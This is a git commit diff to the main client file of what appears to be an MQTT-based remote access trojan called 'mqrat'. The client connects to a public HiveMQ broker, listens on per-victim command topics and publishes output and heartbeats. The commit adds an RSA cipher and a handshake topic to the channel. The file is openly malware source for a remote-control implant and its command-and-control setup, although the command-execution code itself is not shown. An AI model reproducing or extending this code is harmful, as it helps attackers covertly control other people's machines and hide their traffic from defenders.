96f79ffae79e9adf266bfdb4d6e7dd7eb850abf5
Lucas Vieira <lucas.engen.cc@gmail.com>
2021-02-14 23:43:15 -0300

    chore: :hammer: pass RSA cipher to mqtt client instance
    Signed-off-by: Lucas Vieira <lucas.engen.cc@gmail.com>

--- MQClient/main.cc
+++ MQClient/main.cc
@@ -19,6 +19,7 @@
 #include "log.hpp"
 #include "utils.hpp"
 #include "network.hpp"
+#include "crypto.hpp"
 
 using namespace std;
 
@@ -30,10 +31,15 @@ int main() {
 	string topic_name = "mqrat/cmd/";
 	unsigned QoS = 0;
 	MqttClient *client = nullptr;
+	Crypto::RSACipher *cipher = new Crypto::RSACipher();
+
+	if(!cipher) {
+		Log::LogPanic("Failed to allocate memory for RSA Cipher object");
+	}
 
 	signal(SIGSEGV, sigsegv_handler);
 
-	client = new MqttClient(QoS, "tcp://broker.hivemq.com:1883");
+	client = new MqttClient(QoS, "tcp://broker.hivemq.com:1883", cipher);
 	if(!client) {
 		Log::LogPanic("Failed to initialize MQTT client");
 	}
@@ -45,16 +51,19 @@ int main() {
 	auto heartbeat_topic = topic_name + Utils::GenerateID();
 	auto recv_topic = heartbeat_topic + "/command";
 	auto send_topic = heartbeat_topic + "/output";
+	auto handshake_topic = heartbeat_topic + "/hs";
 
 	client->setRecvTopic(recv_topic);
 	client->setSendTopic(send_topic);
 	client->setHeartbeatTopic(heartbeat_topic);
+	client->setHandshakeTopic(handshake_topic);
 
 	// Connect to broker
 	client->Connect();
 
 	// Subscribe to topic where command will be received
 	client->Subscribe(recv_topic);
+	client->Subscribe(handshake_topic);
 
 	// Internal loop
 	std::thread mqtt_thread(&MqttClient::Loop, client);
@@ -62,6 +71,9 @@ int main() {
 	Log::LogInfo("Started MQTT client thread");
 	if(mqtt_thread.joinable())
 		mqtt_thread.join();
+
+	// Free resources
+	delete cipher;
 
     return 0;
 }
